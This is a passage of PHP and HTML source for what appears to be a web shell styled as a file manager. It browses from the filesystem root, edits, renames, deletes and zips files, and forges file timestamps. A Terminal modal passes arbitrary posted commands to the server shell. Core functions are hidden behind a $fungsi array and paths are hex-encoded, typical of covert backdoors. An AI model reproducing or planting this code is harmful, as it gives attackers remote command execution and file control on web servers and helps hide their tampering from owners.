                    <svg width="22" height="22" fill="#7c3aed" viewBox="0 0 24 24"><path d="M20 13H4v-2h16v2zm0-6H4V5h16v2zm0 12H4v-2h16v2z"/></svg>
                    Adminer
                </a>
            </div>

            <!-- ═══ ADDRESS BAR ══════════════════════════════════════════════ -->
            <div class="addrbar">
                <!-- Back button -->
                <?php if ($parent !== $get_cwd): ?>
                    <a href="?d=<?= hx($parent) ?>" title="Up" style="display:flex;align-items:center;padding:2px 6px;border-radius:3px;border:1px solid transparent;transition:all .1s" onmouseover="this.style.background='var(--bg-hover)';this.style.borderColor='var(--border)'" onmouseout="this.style.background='';this.style.borderColor='transparent'">
                        <svg width="16" height="16" fill="var(--text-sub)" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                    </a>
                <?php endif; ?>

                <!-- Path bar: click to toggle copyable input -->
                <div class="addrbar-inner" id="addrbar-breadcrumb" style="cursor:default;flex:1;min-width:0" title="Click to copy path">
                    <svg width="14" height="14" fill="#d97706" viewBox="0 0 24 24" style="flex-shrink:0"><path d="M10 4H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                    <div id="bc-links" style="display:flex;align-items:center;gap:0;overflow:hidden;white-space:nowrap">
                        <?php
                        $cwd_str = str_replace("\\","/",$get_cwd);
                        $parts   = explode("/",$cwd_str);
                        if(stristr(PHP_OS,"WIN")) windowsDriver();
                        echo '<a href="?d='.hx('/').'" class="bc-link">Root</a>';
                        foreach($parts as $id => $val){
                            if($val==='')continue;
                            echo '<span class="bc-sep">/</span>';
                            $path='';for($i=0;$i<=$id;$i++){$path.=$parts[$i];if($i!=$id)$path.='/';}
                            echo '<a href="?d='.hx($path).'" class="bc-link">'.htmlspecialchars($val).'</a>';
                        }
                        echo '<span class="bc-sep">/</span>';
                        echo '<a href="?d='.hx(__DIR__).'" style="background:var(--bg-tag);border-radius:2px;padding:1px 6px" class="bc-link">🏠 Home</a>';
                        ?>
                    </div>
                    <!-- Copyable path input (hidden by default) -->
                    <input id="bc-path-input" type="text" value="<?= htmlspecialchars($cwd_str) ?>"
                    style="display:none;flex:1;border:none;outline:none;background:transparent;color:var(--text);font-size:12px;min-width:0"
                    onblur="togglePathInput(false)" onkeydown="if(event.key==='Escape'||event.key==='Enter')togglePathInput(false)">
                    <!-- Copy indicator -->
                    <span id="bc-copied" style="display:none;font-size:10px;color:var(--accent);margin-left:6px;white-space:nowrap">✓ Copied!</span>
                </div>

                <!-- Functional Search -->
                <form action="" method="GET" id="search-form" style="display:flex;align-items:center;background:var(--bg-input);border:1px solid var(--border-input);border-radius:3px;height:26px;overflow:hidden;width:240px;flex-shrink:0">
                    <input type="hidden" name="d" value="<?= hx($get_cwd) ?>">
                        <svg width="13" height="13" fill="var(--text-muted)" viewBox="0 0 24 24" style="margin-left:8px;flex-shrink:0"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                    <input type="text" name="q" id="search-input" value="<?= htmlspecialchars($_GET['q'] ?? '') ?>"
                    placeholder="Search in this folder…"
                    style="flex:1;border:none;outline:none;background:transparent;color:var(--text);font-size:12px;padding:0 8px;height:100%">
                    <?php if(!empty($_GET['q'])): ?>
                        <a href="?d=<?= hx($get_cwd) ?>" style="padding:0 7px;color:var(--text-muted);font-size:14px;line-height:26px;text-decoration:none" title="Clear search">×</a>
                    <?php endif; ?>
                </form>
            </div>

            <?php
            // ─── Search filter: if ?q= is set, filter $file_manager ───────────────
            if (!empty($_GET['q'])) {
                $q = strtolower(trim($_GET['q']));
                $file_manager = array_values(array_filter($file_manager, function($item) use ($q) {
                    return strpos(strtolower(basename($item)), $q) !== false;
                }));
            }
            ?>

            <!-- ═══ MAIN ══════════════════════════════════════════════════════ -->
            <div class="main">

                <!-- Sidebar -->
                <div class="sidebar">
                    <div class="sidebar-section">
                        <div class="sidebar-heading">
                            Quick access
                        </div>
                        <a href="?d=<?= hx(__DIR__) ?>" class="sidebar-item <?= $get_cwd===__DIR__?'active':'' ?>">
                            <svg width="15" height="15" fill="#d97706" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                            Home
                        </a>
                        <a href="?d=<?= hx('/') ?>" class="sidebar-item <?= $get_cwd==='/'?'active':'' ?>">
                            <svg width="15" height="15" fill="#0078d4" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                            Root /
                        </a>
                        <a href="?d=<?= hx('/tmp') ?>" class="sidebar-item">
                            <svg width="15" height="15" fill="#888" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>
                            /tmp
                        </a>
                        <a href="?d=<?= hx('/var/www') ?>" class="sidebar-item">
                            <svg width="15" height="15" fill="#d97706" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                            /var/www
                        </a>
                    </div>
                    <div class="sidebar-section" style="border-top:1px solid var(--border);margin-top:4px;padding-top:8px">
                        <div class="sidebar-heading">
                            Server info
                        </div>
                        <div style="padding:4px 14px;font-size:11px;color:var(--text-muted);line-height:1.8">
                            <div><?= htmlspecialchars(php_uname('s')) ?> <?= htmlspecialchars(php_uname('r')) ?></div>
                            <div><?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? '—') ?></div>
                            <div>User: <?= $fungsi[9]() ?></div>
                        </div>
                    </div>
                </div>

                <!-- Content -->
                <div class="content">
                    <div class="content-table-wrap">
                        <form action="" method="post" id="file-form">
                            <table class="file-table">
                                <thead>
                                    <tr>
                                    <th style="width:40%">Name</th>
                                    <th style="width:9%">Size</th>
                                    <th style="width:9%">Type</th>
                                    <th style="width:14%">Permission</th>
                                    <th style="width:16%">Date modified</th>
                                    <th style="width:12%;text-align:center">Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <!-- Parent dir row -->
                                    <?php if($parent !== $get_cwd): ?>
                                        <tr class="frow">
                                            <td colspan="6">
                                            <a href="?d=<?= hx($parent) ?>" class="fname-cell" style="color:var(--text-sub);font-size:12px">
                                                <svg width="16" height="16" fill="#d97706" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                                                ..
                                            </a>
                                            </td>
                                        </tr>
                                    <?php endif; ?>

                                    <!-- FOLDERS -->
                                    <?php foreach($file_manager as $_D): if(!$fungsi[2]($_D))continue; $fp=$get_cwd.'/'.$_D; $mt=@filemtime($fp); ?>
                                        <tr class="frow">
                                            <td>
                                                <a href="?d=<?= hx($get_cwd.'/'.$_D) ?>" class="fname-cell">
                                                    <svg width="16" height="16" fill="#d97706" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
                                                    <span style="color:var(--text)"><?= htmlspecialchars(fullName($_D)) ?></span>
                                                </a>
                                            </td>
                                            <td style="color:var(--text-muted)">—</td>
                                            <td style="color:var(--text-muted)">Folder</td>
                                            <td class="<?= $fungsi[4]($fp)?'perm-ok':'perm-no' ?>" style="font-family:monospace;font-size:11px"><?= perms($fp) ?></td>
                                            <td>
                                                <div style="display:flex;align-items:center;gap:5px">
                                                    <span style="color:var(--text-sub)"><?= $mt?date('d/m/Y H:i',$mt):'—' ?></span>
                                                    <a href="?d=<?= hx($get_cwd) ?>&touch=<?= hx($_D) ?>" title="Edit timestamp" style="color:var(--text-muted);display:flex;align-items:center;flex-shrink:0" onmouseover="this.style.color='var(--text-link)'" onmouseout="this.style.color='var(--text-muted)'">
                                                    <svg width="11" height="11" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                                    </a>
                                                </div>
                                            </td>
                                            <td style="text-align:center">
                                                <div style="display:flex;align-items:center;justify-content:center;gap:2px">
                                                    <a href="?d=<?= hx($get_cwd) ?>&re=<?= hx($_D) ?>" class="act-btn" title="Rename">
                                                    <svg width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                                    </a>
                                                    <button type="submit" name="btn-delete" value="<?= htmlspecialchars($_D) ?>" class="act-btn del" title="Delete">
                                                    <svg width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                                    </button>
                                                    <button type="submit" name="btn-zip" value="<?= htmlspecialchars($_D) ?>" class="act-btn" title="Zip" style="font-size:10px;font-weight:700">ZIP</button>
                                                </div>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>

                                    <!-- FILES -->
                                    <?php foreach($file_manager as $_F): if(!$fungsi[3]($_F))continue; $fp=$get_cwd.'/'.$_F; $mt=@filemtime($fp); $ext=strtolower(pathinfo($_F,PATHINFO_EXTENSION)); ?>
                                        <tr class="frow">
                                            <td>
                                                <a href="?d=<?= hx($get_cwd) ?>&f=<?= hx($_F) ?>" class="fname-cell" style="color:var(--text)">
                                                    <?= file_ext_icon($_F) ?>
                                                    <span><?= htmlspecialchars(fullName($_F)) ?></span>
                                                </a>
                                            </td>
                                            <td style="color:var(--text-sub)"><?= formatSize(filesize($_F)) ?></td>
                                            <td style="color:var(--text-muted);text-transform:uppercase"><?= $ext?:' — ' ?></td>
                                            <td class="<?= is_writable($fp)?'perm-ok':'perm-no' ?>" style="font-family:monospace;font-size:11px"><?= perms($fp) ?></td>
                                            <td>
                                                <div style="display:flex;align-items:center;gap:5px">
                                                    <span style="color:var(--text-sub)"><?= $mt?date('d/m/Y H:i',$mt):'—' ?></span>
                                                    <a href="?d=<?= hx($get_cwd) ?>&touch=<?= hx($_F) ?>" title="Edit timestamp" style="color:var(--text-muted);display:flex;align-items:center;flex-shrink:0" onmouseover="this.style.color='var(--text-link)'" onmouseout="this.style.color='var(--text-muted)'">
                                                    <svg width="11" height="11" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                                    </a>
                                                </div>
                                            </td>
                                            <td style="text-align:center">
                                                <div style="display:flex;align-items:center;justify-content:center;gap:2px">
                                                    <a href="?d=<?= hx($get_cwd) ?>&re=<?= hx($_F) ?>" class="act-btn" title="Rename">
                                                    <svg width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                                    </a>
                                                    <button type="submit" name="btn-delete" value="<?= htmlspecialchars($_F) ?>" class="act-btn del" title="Delete">
                                                    <svg width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                                    </button>
                                                    <?php if($ext==='zip'): ?>
                                                    <button type="submit" name="btn-unzip" value="<?= htmlspecialchars($_F) ?>" class="act-btn" title="Extract" style="font-size:10px;font-weight:700">EXT</button>
                                                    <?php endif; ?>
                                                </div>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </form>
                    </div>

                    <!-- Status bar -->
                    <div class="statusbar">
                        <span><?= count($file_manager) ?> item(s)</span>
                        <span style="overflow:hidden;text-overflow:ellipsis;max-width:60%"><?= htmlspecialchars($get_cwd) ?></span>
                        <span><?= htmlspecialchars($_SERVER['SERVER_NAME']) ?></span>
                    </div>
                </div><!-- /content -->
            </div><!-- /main -->
        </div><!-- /app -->

        <!-- ═══ CONTEXT MENU ════════════════════════════════════════════ -->
        <div id="ctx-menu" style="
        display:none; position:fixed; z-index:9999;
        background:var(--bg-modal); border:1px solid var(--border);
        border-radius:5px; box-shadow:0 4px 20px rgba(0,0,0,.22);
        padding:4px 0; min-width:170px; user-select:none;
        ">
            <div id="ctx-item-name" style="
                padding:6px 16px 5px; font-size:11px; color:var(--text-muted);
                border-bottom:1px solid var(--border); margin-bottom:3px;
                white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:220px;
            "></div>
            <button class="ctx-btn" id="ctx-copy">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
                Copy
            </button>
            <button class="ctx-btn" id="ctx-cut">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M9.64 7.64c.23-.5.36-1.05.36-1.64 0-2.21-1.79-4-4-4S2 3.79 2 6s1.79 4 4 4c.59 0 1.14-.13 1.64-.36L10 12l-2.36 2.36C7.14 14.13 6.59 14 6 14c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4c0-.59-.13-1.14-.36-1.64L12 14l7 7h3v-1L9.64 7.64zM6 8c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm0 12c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm6-7.5c-.28 0-.5-.22-.5-.5s.22-.5.5-.5.5.22.5.5-.22.5-.5.5zM19 3l-6 6 2 2 7-7V3z"/></svg>
                Cut
            </button>
            <div style="height:1px;background:var(--border);margin:3px 0"></div>
            <button class="ctx-btn ctx-btn-paste" id="ctx-paste" style="display:none">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg>
                Paste here
            </button>
            <div style="height:1px;background:var(--border);margin:3px 0"></div>
            <button class="ctx-btn ctx-btn-danger" id="ctx-delete">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                Delete
            </button>
        </div>

        <!-- ═══════════════════════════════════════════════════════════════
            MODALS
        ═══════════════════════════════════════════════════════════════ -->

        <!-- Modal: New Folder / File -->
        <div class="modal-overlay hidden" id="modal-create">
            <div class="modal-box" style="width:340px">
                <div class="modal-titlebar">
                    <span id="modal-create-title">New Folder</span>
                    <button class="modal-close" id="modal-create-close">&times;</button>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div id="modal-create-field"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn-secondary" id="modal-create-cancel">Cancel</button>
                        <button type="submit" name="submit" class="btn-primary">Create</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Modal: Terminal -->
        <?php if(isset($_GET['terminal'])): ?>
            <div class="modal-overlay" id="modal-terminal">
                <div class="modal-box terminal-box" style="width:660px">
                    <div class="modal-titlebar" style="background:#2d2d2d;border-bottom:1px solid #3a3a3a">
                        <div style="display:flex;align-items:center;gap:8px">
                            <svg width="14" height="14" fill="#64d18a" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 8l4 4-4 4 1.4 1.4L12.8 12 7.4 6.6 6 8z"/></svg>
                            <span style="color:#d4d4d4;font-size:13px">Terminal — <?= htmlspecialchars($get_cwd) ?></span>
                        </div>
                        <a href="?d=<?= hx($get_cwd) ?>" class="modal-close" style="color:#666">&times;</a>
                    </div>
                    <pre class="terminal-output">
                        <?php
                            if(isset($_POST['btn-terminal'])) echo htmlspecialchars($fungsi[10](terminal_cmd($_POST['terminal-text']." 2>&1")));
                            else echo "File Manager Terminal\nType a command and press Enter or click Run.\n";
                        ?>
                    </pre>
                    <form action="" method="post">
                        <div class="terminal-input-row">
                            <span class="terminal-prompt">$ </span>
                            <input type="text" name="terminal-text" autofocus placeholder="<?= htmlspecialchars($fungsi[9]().'@'.$_SERVER['SERVER_ADDR'].':'.$get_cwd) ?>">
                            <button type="submit" name="btn-terminal" class="terminal-run-btn">▶ Run</button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

        <!-- Modal: Rename -->
        <?php if(isset($_GET['re'])&&$_GET['re']): ?>
            <div class="modal-overlay" id="modal-rename">
                <div class="modal-box" style="width:360px">
                    <div class="modal-titlebar">
                        <span>Rename</span>
                        <a href="<?= clean_url() ?>" class="modal-close">&times;</a>
                    </div>
                    <form action="" method="post">
                        <div class="modal-body">
                            <div>
                                <div class="field-label">
                                    Current name
                                </div>
                                <div class="info-box">
                                    <?= htmlspecialchars(decrypt_hex($_GET['re'])) ?>
                                </div>
                            </div>
                            <div>
                                <div class="field-label">
                                    New name
                                </div>
                                <input type="text" name="renameFile" autofocus class="fm-input" placeholder="Enter new name (with extension)">
                            </div>
                        </div>
                        <div class="modal-footer">
                            <a href="<?= clean_url() ?>" class="btn-secondary">Cancel</a>
                            <button type="submit" name="submit" class="btn-primary">Rename</button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

        <!-- Modal: Code Editor -->
        <?php if(isset($_GET['f'])): ?>
            <div class="modal-overlay" id="modal-editor">
                <div class="modal-box code-editor-wrap" style="width:min(900px,95vw)">
                    <div class="code-editor-header">
                        <div style="display:flex;align-items:center;gap:7px">
                            <svg width="14" height="14" fill="var(--accent)" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>
                            <span style="font-size:13px;font-weight:600;color:var(--text)">Editing: </span>
                            <span style="font-size:13px;color:var(--accent)"><?= htmlspecialchars(decrypt_hex($_GET['f'])) ?></span>
                        </div>
                        <a href="<?= clean_url() ?>" class="modal-close" style="color:var(--text-muted);font-size:20px">&times;</a>
                    </div>
                    <form action="" method="post">
                        <textarea name="edited_code_data" class="code-textarea"><?= htmlspecialchars($fungsi[11]($get_cwd.'/'.decrypt_hex($_GET['f']))) ?></textarea>
                        <div class="modal-footer" style="background:var(--bg-header)">
                            <a href="<?= clean_url() ?>" class="btn-secondary">Cancel</a>
                            <button type="submit" name="btn-save-file" class="btn-primary">
                            <svg width="14" height="14" fill="currentColor" style="vertical-align:middle;margin-right:4px" viewBox="0 0 24 24"><path d="M17 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V7l-4-4zm-5 16c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-10H5V5h10v4z"/></svg>
                            Save
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

        <!-- Modal: Edit Timestamp -->
        <?php if(isset($_GET['touch'])):
            $tt=$get_cwd.'/'.decrypt_hex($_GET['touch']);
            $mt2=@filemtime($tt)?:time();
        ?>
            <div class="modal-overlay" id="modal-touch">
                <div class="modal-box" style="width:340px">
                    <div class="modal-titlebar">
                        <span>Change Date &amp; Time</span>
                        <a href="?d=<?= hx($get_cwd) ?>" class="modal-close">&times;</a>
                    </div>
                    <form action="" method="post">
                        <div class="modal-body">
                            <div>
                                <div class="field-label">File / Folder</div>
                                <div class="info-box" style="overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars(fullName(decrypt_hex($_GET['touch']))) ?></div>
                            </div>
                            <div class="info-box">
                                Current: <strong><?= date('d/m/Y H:i:s',$mt2) ?></strong>
                            </div>
                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
                                <div>
                                    <div class="field-label">Hour (0–23)</div>
                                    <input type="number" name="touch_hour" min="0" max="23" value="<?= date('H',$mt2) ?>" class="fm-input" style="text-align:center">
                                </div>
                                <div>
                                    <div class="field-label">Minute (0–59)</div>
                                    <input type="number" name="touch_minute" min="0" max="59" value="<?= date('i',$mt2) ?>" class="fm-input" style="text-align:center">
                                </div>
                                <div>
                                    <div class="field-label">Day (1–31)</div>
                                    <input type="number" name="touch_day" min="1" max="31" value="<?= date('d',$mt2) ?>" class="fm-input" style="text-align:center">
                                </div>
                                <div>
                                    <div class="field-label">Month (1–12)</div>
                                    <input type="number" name="touch_month" min="1" max="12" value="<?= date('m',$mt2) ?>" class="fm-input" style="text-align:center">
                                </div>
                                <div style="grid-column:span 2">
                                    <div class="field-label">Year (1970–2099)</div>
                                    <input type="number" name="touch_year" min="1970" max="2099" value="<?= date('Y',$mt2) ?>" class="fm-input" style="text-align:center">
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <a href="?d=<?= hx($get_cwd) ?>" class="btn-secondary">Cancel</a>
                            <button type="submit" name="btn-touch" class="btn-primary">Apply</button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

    <script>
        // ─── Address bar: click to copy path ─────────────────────────
        function togglePathInput(show) {
        var links  = document.getElementById('bc-links');
        var input  = document.getElementById('bc-path-input');
        var copied = document.getElementById('bc-copied');
        if (show) {
            links.style.display  = 'none';
            input.style.display  = '';
            copied.style.display = 'none';
            input.select();
            try {
            navigator.clipboard.writeText(input.value).then(function(){
                copied.style.display = '';
                setTimeout(function(){ copied.style.display='none'; }, 1800);
            }).catch(function(){
                document.execCommand('copy');
                copied.style.display = '';
                setTimeout(function(){ copied.style.display='none'; }, 1800);
            });
            } catch(e) {
            try { document.execCommand('copy'); } catch(e2){}
            copied.style.display = '';
            setTimeout(function(){ copied.style.display='none'; }, 1800);
            }
        } else {
            links.style.display  = '';
            input.style.display  = 'none';
        }
        }
        var addrbar = document.getElementById('addrbar-breadcrumb');
        if (addrbar) {
        addrbar.addEventListener('click', function(e) {
            if (e.target.tagName === 'A') return;
            togglePathInput(true);
        });
        }

        // ─── Search: highlight matching rows client-side ──────────────
        (function(){
        var si = document.getElementById('search-input');
        if (!si) return;
        var q = si.value.trim().toLowerCase();
        if (q) {
            document.querySelectorAll('tr.frow').forEach(function(row) {
            var cell = row.querySelector('.fname-cell');
            if (cell && cell.textContent.toLowerCase().indexOf(q) !== -1) {
                row.style.outline = '1px solid var(--accent)';
            }
            });
        }
        // Live filter as you type (client-side instant filter)
        si.addEventListener('input', function(){
            var val = this.value.trim().toLowerCase();
            document.querySelectorAll('tr.frow').forEach(function(row){
            if (!val) { row.style.display=''; return; }
            var cell = row.querySelector('.fname-cell');
            row.style.display = (cell && cell.textContent.toLowerCase().indexOf(val) !== -1) ? '' : 'none';
            });
        });
        })();

        // ─── Theme toggle ─────────────────────────────────────────────
        (function(){
        var saved = localStorage.getItem('fm-theme') || 'light';
        document.documentElement.setAttribute('data-theme', saved);
        updateThemeUI(saved);
        })();

        function updateThemeUI(t){
        var moon = document.getElementById('theme-icon-moon');
        var sun  = document.getElementById('theme-icon-sun');
        var lbl  = document.getElementById('theme-label');
        if(t==='dark'){
            moon.style.display='none'; sun.style.display=''; lbl.textContent='Light';
        } else {
            moon.style.display=''; sun.style.display='none'; lbl.textContent='Dark';
        }
        }

        document.getElementById('theme-toggle').addEventListener('click', function(){
        var cur = document.documentElement.getAttribute('data-theme');
        var next = cur==='dark' ? 'light' : 'dark';
        document.documentElement.setAttribute('data-theme', next);
        localStorage.setItem('fm-theme', next);
        updateThemeUI(next);
        });

        // ─── New folder/file modals ───────────────────────────────────
        document.getElementById('btn-new-folder').addEventListener('click',function(){
        document.getElementById('modal-create-title').textContent='New Folder';
        document.getElementById('modal-create-field').innerHTML=
            '<div class="field-label">Folder name</div><input type="text" name="create_folder" autofocus class="fm-input" placeholder="My Folder">';
        document.getElementById('modal-create').classList.remove('hidden');
        setTimeout(()=>document.querySelector('#modal-create-field input').focus(),40);
        });
        document.getElementById('btn-new-file').addEventListener('click',function(){
        document.getElementById('modal-create-title').textContent='New File';
        document.getElementById('modal-create-field').innerHTML=
            '<div class="field-label">File name (with extension)</div><input type="text" name="create_file" autofocus class="fm-input" placeholder="index.php">';
        document.getElementById('modal-create').classList.remove('hidden');
        setTimeout(()=>document.querySelector('#modal-create-field input').focus(),40);
        });
        document.getElementById('modal-create-close').addEventListener('click',()=>document.getElementById('modal-create').classList.add('hidden'));
        document.getElementById('modal-create-cancel').addEventListener('click',()=>document.getElementById('modal-create').classList.add('hidden'));
        document.getElementById('modal-create').addEventListener('click',function(e){if(e.target===this)this.classList.add('hidden');});

        // ─── File upload label ────────────────────────────────────────
        document.getElementById('file-upload').addEventListener('change',function(){
        var fn=document.getElementById('upload-filename');
        var sb=document.getElementById('upload-submit-btn');
        if(this.files&&this.files.length>0){
            fn.textContent=this.files[0].name; fn.style.display='';
            sb.style.display='flex';
        }
        });

        // ─── Right-click Context Menu ─────────────────────────────────
        (function(){
            var menu      = document.getElementById('ctx-menu');
            var ctxName   = document.getElementById('ctx-item-name');
            var ctxCopy   = document.getElementById('ctx-copy');
            var ctxCut    = document.getElementById('ctx-cut');
            var ctxDelete = document.getElementById('ctx-delete');
            var ctxPaste  = document.getElementById('ctx-paste');

            var targetRow = null;
            var targetVal = null;
            var clipboard = null;  // { val, op:'copy'|'cut', row }

            // Server-side clipboard active (after copy/cut action saved to session)
            var serverClipboard = <?= isset($_SESSION['clipboard']) ? 'true' : 'false' ?>;

            function refreshPasteBtn() {
                ctxPaste.style.display = (clipboard || serverClipboard) ? '' : 'none';
            }

            function showMenu(x, y) {
                refreshPasteBtn();
                menu.style.display = 'block';
                var vw = window.innerWidth, vh = window.innerHeight;
                var mw = menu.offsetWidth  || 190;
                var mh = menu.offsetHeight || 170;
                menu.style.left = (x + mw > vw ? vw - mw - 6 : x) + 'px';
                menu.style.top  = (y + mh > vh ? vh - mh - 6 : y) + 'px';
            }

            function hideMenu() {
                menu.style.display = 'none';
                targetRow = null; targetVal = null;
            }

            // Attach contextmenu to every file/folder row
            document.querySelectorAll('tr.frow').forEach(function(row) {
                var delBtn = row.querySelector('button[name="btn-delete"]');
                if (!delBtn) return;
                row.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                targetRow = row;
                targetVal = delBtn.value;
                var nameEl = row.querySelector('.fname-cell span');
                ctxName.textContent = nameEl ? nameEl.textContent.trim() : targetVal;
                showMenu(e.clientX + 2, e.clientY + 2);
                });
            });

            // Hide on outside click / Escape
            document.addEventListener('click', function(e) { if (!menu.contains(e.target)) hideMenu(); });
            document.addEventListener('keydown', function(e) { if (e.key === 'Escape') hideMenu(); });

            // ── COPY ─────────────────────────────────────────────────────
            ctxCopy.addEventListener('click', function() {
                if (!targetVal) return;
                if (clipboard && clipboard.op === 'cut' && clipboard.row) clipboard.row.classList.remove('is-cut');
                clipboard = { val: targetVal, op: 'copy', row: targetRow };
                serverClipboard = false;
                // POST to save in session
                submitHidden({ ctx_action:'copy', ctx_item: targetVal });
                hideMenu();
            });

            // ── CUT ──────────────────────────────────────────────────────
            ctxCut.addEventListener('click', function() {
                if (!targetVal) return;
                if (clipboard && clipboard.op === 'cut' && clipboard.row) clipboard.row.classList.remove('is-cut');
                clipboard = { val: targetVal, op: 'cut', row: targetRow };
                targetRow && targetRow.classList.add('is-cut');
                serverClipboard = false;
                submitHidden({ ctx_action:'cut', ctx_item: targetVal });
                hideMenu();
            });

            // ── PASTE ────────────────────────────────────────────────────
            ctxPaste.addEventListener('click', function() {
                // Navigate to current URL + ctx_paste=1 to trigger PHP paste handler
                var url = window.location.href.split('?')[0];
                var params = new URLSearchParams(window.location.search);
                params.set('ctx_paste', '1');
                window.location.href = url + '?' + params.toString();
                hideMenu();
            });

            // ── DELETE ───────────────────────────────────────────────────
            ctxDelete.addEventListener('click', function() {
                if (!targetVal) return;
                if (!confirm('Delete "' + targetVal + '"?\nThis cannot be undone.')) { hideMenu(); return; }
                submitHidden({ 'btn-delete': targetVal });
                hideMenu();
            });

            // Helper: submit hidden form with POST data to current URL
            function submitHidden(data) {
                var form = document.createElement('form');
